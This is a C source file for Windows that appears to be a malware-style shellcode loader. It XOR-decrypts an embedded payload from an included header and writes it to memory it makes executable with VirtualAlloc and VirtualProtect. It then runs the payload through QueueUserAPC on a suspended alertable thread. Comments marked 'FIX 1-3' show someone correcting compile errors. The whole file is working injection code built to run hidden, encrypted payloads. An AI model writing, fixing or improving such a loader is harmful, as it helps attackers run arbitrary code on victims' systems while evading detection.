#include <stdio.h>
#include <windows.h>
#include "temp.h"

SIZE_T enc_len = sizeof(shellcode);
char key[] = "xyz";

// FIX 1: Non-void function must return a value
DWORD WINAPI AlterableFunction2(){
    SleepEx(INFINITE, TRUE);
    return 0; // <- add return to fix warning
}

VOID xor_decrypt(unsigned char *data, SIZE_T len, char *key){
    SIZE_T keylen = strlen(key);
    for(SIZE_T i = 0; i < len; i++){
        data[i] ^= key[i % keylen];
    }
}

BOOL gogogo(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize){
    PVOID pAddress = NULL;

    // FIX 2: Use correct type for VirtualProtect's old protection
    DWORD dwOldProtection = 0;

    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        return FALSE;
    }

    // FIX 3: NULL is (void *), but QueueUserAPC wants ULONG_PTR (integer type)
    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL)) {
        return FALSE;
    }

    return TRUE;
}

int main(){
    HANDLE hthread = CreateThread(NULL, 0, AlterableFunction2, NULL, CREATE_SUSPENDED, NULL);
    if (!hthread) return 1;

    xor_decrypt(shellcode, sizeof(shellcode), key);

    if (!gogogo(hthread, (PBYTE)shellcode, sizeof(shellcode))) {
        printf("didn't queue APC\n");
    }

    ResumeThread(hthread);
    WaitForSingleObject(hthread, INFINITE);
    CloseHandle(hthread);

    return 0;
}
